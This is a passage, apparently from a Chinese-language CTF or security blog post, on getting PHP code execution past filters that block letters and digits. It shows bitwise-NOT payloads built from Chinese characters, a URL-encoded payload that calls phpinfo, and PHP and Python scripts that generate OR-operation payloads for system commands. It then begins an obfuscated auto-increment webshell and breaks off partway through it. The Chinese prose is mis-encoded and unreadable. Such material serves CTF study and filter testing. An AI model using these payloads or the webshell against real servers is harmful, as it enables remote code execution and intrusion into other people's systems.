class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;ç°&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;å’Œ&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;å’Œ&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;çš„&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;åŠ&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;å§‹&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<br><br><span class="hljs-variable">$_____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;ä¿¯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;ç°&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;æ¬¡&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;ç«™&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<br><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<br><span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨äº†PHPçš„å¼±ç±»å‹ç‰¹æ€§ã€‚å› ä¸ºè¦è·å–<code>&#39;å’Œ&#39;&#123;2&#125;</code>ï¼Œå°±å¿…é¡»æœ‰æ•°å­—2ã€‚è€ŒPHPç”±äºå¼±ç±»å‹è¿™ä¸ªç‰¹æ€§ï¼Œtrueçš„å€¼ä¸º1ï¼Œæ•…<code>true+true==2</code>ï¼Œä¹Ÿå°±æ˜¯<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>ã€‚</p><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;ç°&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;å’Œ&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;å’Œ&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;çš„&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;åŠ&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;å§‹&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_____</span>=_;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;ä¿¯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;ç°&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;æ¬¡&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;ç«™&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br>æˆ–:<br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$___</span>=ç°;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=å’Œ;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=å’Œ;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=çš„;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=åŠ;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=å§‹;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_____</span>=_;<span class="hljs-variable">$___</span>=ä¿¯;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=ç°;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=æ¬¡;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=ç«™;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br></code></pre></td></tr></table></figure><h3 id="URLç¼–ç å–åç»•è¿‡"><a href="#URLç¼–ç å–åç»•è¿‡" class="headerlink" title="URLç¼–ç å–åç»•è¿‡"></a>URLç¼–ç å–åç»•è¿‡</h3><p>åˆšæ‰æˆ‘ä»¬ä»‹ç»çš„æ˜¯é€šè¿‡å–åæ±‰å­—æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å­—æ¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç›´æ¥å¯¹ä¸€ä¸²æ¶æ„ä»£ç è¿›è¡Œå–åç„¶å URL ç¼–ç ï¼Œåœ¨å‘é€ Payload çš„æ—¶å€™å†æ¬¡å°†å…¶å–åä¾¿å¯å°†ä»£ç è¿˜åŸï¼Œç„¶åå°†å…¶åŠ¨æ€æ‰§è¡Œã€‚å¹¶ä¸”ï¼Œå› ä¸ºæ˜¯å–åï¼ŒåŸºæœ¬ä¸Šç”¨çš„éƒ½æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šè§¦å‘åˆ°æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br>%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span><br>php &gt; <br></code></pre></td></tr></table></figure><h4 id="Payloadï¼š"><a href="#Payloadï¼š" class="headerlink" title="Payloadï¼š"></a>Payloadï¼š</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();    <span class="hljs-comment">// phpinfo();</span><br></code></pre></td></tr></table></figure><h2 id="æˆ–è¿ç®—"><a href="#æˆ–è¿ç®—" class="headerlink" title="æˆ–è¿ç®—"></a>æˆ–è¿ç®—</h2><p>PHP ä¸­ä¸¤ä¸ªå­—ç¬¦ä¸²å¼‚æˆ–ä¹‹åå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚é‚£ä¹ˆæˆ–è¿ç®—åŸç†ä¹Ÿæ˜¯ä¸€æ ·ï¼Œå¦‚æœæ­£åˆ™åŒ¹é…è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ï¼Œé‚£å°±å¯ä»¥ä½¿ç”¨ä¸¤ä¸ªä¸åœ¨æ­£åˆ™åŒ¹é…èŒƒå›´å†…çš„éå­—æ¯éæ•°å­—çš„å­—ç¬¦è¿›è¡Œæˆ–è¿ç®—ï¼Œä»è€Œå¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦ä¸²ã€‚</p><h3 id="æˆ–è¿ç®—æ„é€ è„šæœ¬"><a href="#æˆ–è¿ç®—æ„é€ è„šæœ¬" class="headerlink" title="æˆ–è¿ç®—æ„é€ è„šæœ¬"></a>æˆ–è¿ç®—æ„é€ è„šæœ¬</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;    <span class="hljs-comment">// æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>        <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>        <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>            <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><p>é¦–å…ˆè¿è¡Œä»¥ä¸Š PHP è„šæœ¬åï¼Œä¼šç”Ÿæˆä¸€ä¸ª txt æ–‡æ¡£or_rce.txtï¼Œé‡Œé¢åŒ…å«æ‰€æœ‰å¯è§å­—ç¬¦çš„æˆ–è¿ç®—æ„é€ ç»“æœã€‚</p><p>æ¥ç€è¿è¡Œä»¥ä¸‹ Python è„šæœ¬ï¼Œè¾“å…¥ä½ æƒ³è¦æ„é€ çš„å‡½æ•°åå’Œè¦æ‰§è¡Œçš„å‘½ä»¤å³å¯ç”Ÿæˆæœ€ç»ˆçš„ Payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your commandï¼š&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[+] your functionï¼šsystem<br>[+] your commandï¼šls /<br>(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13%00%00&quot;|&quot;%60%60%20%2f&quot;);<br></code></pre></td></tr></table></figure><h2 id="è‡ªå¢"><a href="#è‡ªå¢" class="headerlink" title="è‡ªå¢"></a>è‡ªå¢</h2><p>åœ¨å¤„ç†å­—ç¬¦å˜é‡çš„ç®—æ•°è¿ç®—æ—¶ï¼ŒPHP æ²¿è¢­äº† Perl çš„ä¹ æƒ¯ï¼Œè€Œé C çš„ã€‚ä¾‹å¦‚ï¼Œåœ¨ Perl ä¸­ <code>$a = &#39;Z&#39;; $a++;</code> å°†æŠŠ <code>$a</code> å˜æˆ<code>&#39;AA&#39;</code>ï¼Œè€Œåœ¨ C ä¸­ï¼Œ<code>a = &#39;Z&#39;; a++;</code> å°†æŠŠ <code>a</code> å˜æˆ <code>&#39;[&#39;</code>ï¼ˆ<code>&#39;Z&#39;</code> çš„ ASCII å€¼æ˜¯ 90ï¼Œ<code>&#39;[&#39;</code> çš„ ASCII å€¼æ˜¯ 91ï¼‰ã€‚</p><p>æ³¨æ„å­—ç¬¦å˜é‡åªèƒ½é€’å¢ï¼Œä¸èƒ½é€’å‡ï¼Œå¹¶ä¸”åªæ”¯æŒçº¯å­—æ¯ï¼ˆa-z å’Œ A-Zï¼‰ã€‚é€’å¢ï¼é€’å‡å…¶ä»–å­—ç¬¦å˜é‡åˆ™æ— æ•ˆï¼ŒåŸå­—ç¬¦ä¸²æ²¡æœ‰å˜åŒ–ã€‚</p><p><a href="https://www.php.net/manual/zh/language.operators.increment.php">https://www.php.net/manual/zh/language.operators.increment.php</a></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;A&quot;</span>++ ==&gt; <span class="hljs-string">&quot;B&quot;</span><br><span class="hljs-string">&quot;B&quot;</span>++ ==&gt; <span class="hljs-string">&quot;C&quot;</span><br><span class="hljs-string">&quot;Z&quot;</span>++ ==&gt; <span class="hljs-string">&quot;AA&quot;</span><br>...<br></code></pre></td></tr></table></figure><p>åªè¦æˆ‘ä»¬èƒ½æ‹¿åˆ°ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼ä¸º <code>A</code>ï¼Œé‚£ä¹ˆé€šè¿‡è‡ªå¢æ“ä½œå³å¯è·å¾— <code>A-Z</code> ä¸­æ‰€æœ‰å­—ç¬¦ã€‚</p><p>åœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸º <code>Array</code>ã€‚è€Œ <code>Array</code> çš„ç¬¬ä¸€ä¸ªå­—æ¯å°±æ˜¯å¤§å†™ Aï¼Œè€Œä¸”ç¬¬4ä¸ªå­—æ¯æ˜¯å°å†™ aã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åŒæ—¶æ‹¿åˆ°å°å†™ a å’Œå¤§å†™ Aï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ° <code>a-z</code> å’Œ <code>A-Z</code> çš„æ‰€æœ‰å­—æ¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&#x27;</span>.[];<br>Array<br>php &gt; <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;&#x27;</span>.[])&#123;<span class="hljs-number">0</span>&#125;;<br>A<br>php &gt; <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;&#x27;</span>.[])&#123;<span class="hljs-number">3</span>&#125;;<br>a<br>php &gt;  <br></code></pre></td></tr></table></figure><h4 id="Webshell-php5"><a href="#Webshell-php5" class="headerlink" title="Webshell(php5):"></a>Webshell(php5):</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[];<br><span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>; <span class="hljs-comment">// $_=&#x27;Array&#x27;;</span><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>]; <span class="hljs-comment">// $_=$_[0];</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>; <span class="hljs-comment">// A</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// E </span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// R</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// P</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span 